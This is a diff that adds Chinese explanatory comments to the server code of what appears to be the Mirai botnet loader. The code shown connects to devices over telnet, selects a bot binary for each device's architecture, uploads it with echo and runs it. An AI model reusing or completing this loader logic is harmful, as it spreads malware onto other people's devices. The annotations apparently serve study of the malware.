@@ -16,7 +16,7 @@
 #include "headers/binary.h"
 #include "headers/util.h"
 
-//创建线程
+//创建threads个线程
 struct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs, uint32_t max_open, char *wghip, port_t wghp, char *thip)
 {
     struct server *srv = calloc(1, sizeof (struct server));
@@ -31,7 +31,7 @@ struct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs, u
     srv->wget_host_port = wghp;
     srv->tftp_host_ip = thip;
     srv->estab_conns = calloc(max_open * 2, sizeof (struct connection *));
-    srv->workers = calloc(threads, sizeof (struct server_worker));
+    srv->workers = calloc(threads, sizeof (struct server_worker));//为threads个线程分配空间
     srv->workers_len = threads;
 
     if (srv->estab_conns == NULL)
@@ -68,7 +68,7 @@ struct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs, u
             return NULL;
         }
 
-        pthread_create(&wrker->thread, NULL, worker, wrker);
+        pthread_create(&wrker->thread, NULL, worker, wrker);//创建子线程，并将epoll fd传入子线程
     }
 
     pthread_create(&srv->to_thrd, NULL, timeout_thread, srv);
@@ -140,12 +140,12 @@ void server_telnet_probe(struct server *srv, struct telnet_info *info)
     memcpy(&conn->info, info, sizeof (struct telnet_info));
     conn->srv = srv;
     conn->fd = fd;
-    connection_open(conn);
+    connection_open(conn);//主线程连接bot节点
 
     addr.sin_family = AF_INET;
     addr.sin_addr.s_addr = info->addr;
     addr.sin_port = info->port;
-    ret = connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
+    ret = connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));//主线程连接bot节点
     if (ret == -1 && errno != EINPROGRESS)
     {
         printf("got connect error\n");
@@ -153,7 +153,7 @@ void server_telnet_probe(struct server *srv, struct telnet_info *info)
 
     event.data.fd = fd;
     event.events = EPOLLOUT;//EPOLLOUT
-    epoll_ctl(wrker->efd, EPOLL_CTL_ADD, fd, &event);//监听新节点上的写事件
+    epoll_ctl(wrker->efd, EPOLL_CTL_ADD, fd, &event);//worker线程监听新节点上的写事件
 }
 
 //线程与cpu核的绑定  多核多线程中一般会使用到
@@ -206,7 +206,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
         printf("yo socket mismatch\n");
     }
 
-    // Check if there was an error
+    // Check if there was an error   epoll出错
     if (ev->events & EPOLLERR || ev->events & EPOLLHUP || ev->events & EPOLLRDHUP)
     {
 #ifdef DEBUG
@@ -217,7 +217,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
         return;
     }
 
-    // Are we ready to write?
+    // Are we ready to write?　　　发生写事件
     if (conn->state_telnet == TELNET_CONNECTING && ev->events & EPOLLOUT)
     {
         struct epoll_event event;
@@ -235,6 +235,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
         }
 
 #ifdef DEBUG
+//触发写事件就表示已经建立了连接？？？？　好像是啊，触发写事件表示这时候socket已经可写，socket可写肯定是已经建立了连接
         printf("[FD%d] Established connection\n", ev->data.fd);
 #endif
         event.data.fd = conn->fd;
@@ -249,19 +250,19 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
         printf("socket not open! conn->fd: %d, fd: %d, events: %08x, state: %08x\n", conn->fd, ev->data.fd, ev->events, conn->state_telnet);
     }
 
-    // Is there data to read?
+    // Is there data to read?  读事件　　且conn的状态是open
     if (ev->events & EPOLLIN && conn->open)
     {
         int ret;
 
         conn->last_recv = time(NULL);
-        while (TRUE)
+        while (TRUE)//ET模式，只触发一次接收，所以需要while(1) 读取所有接收缓存中的数据
         {
             //接收telnet返回的数据，存到conn->rdbuf中。
             ret = recv(conn->fd, conn->rdbuf + conn->rdbuf_pos, sizeof (conn->rdbuf) - conn->rdbuf_pos, MSG_NOSIGNAL);
-            if (ret <= 0)
+            if (ret <= 0)//出错或者读取完了
             {
-                if (errno != EAGAIN && errno != EWOULDBLOCK)
+                if (errno != EAGAIN && errno != EWOULDBLOCK)//出错
                 {
 #ifdef DEBUG
                     if (conn->open)
@@ -396,6 +397,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                         if (consumed)
                         {
                             conn->timeout = 15;
+                            //取得bin文件，conn->bin指向内存中的bin文件
                             if ((conn->bin = binary_get_by_arch(conn->info.arch)) == NULL)//没有此类体系架构的bin文件
                             {
 #ifdef DEBUG
@@ -480,7 +482,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                         }
                         break;
                     case TELNET_UPLOAD_ECHO:   //结束上传，通过telnet远程执行上传的bot
-                        consumed = connection_upload_echo(conn);
+                        consumed = connection_upload_echo(conn);//echo好像是这里上传的bot程序
                         if (consumed)
                         {
                             conn->state_telnet = TELNET_RUN_BINARY;
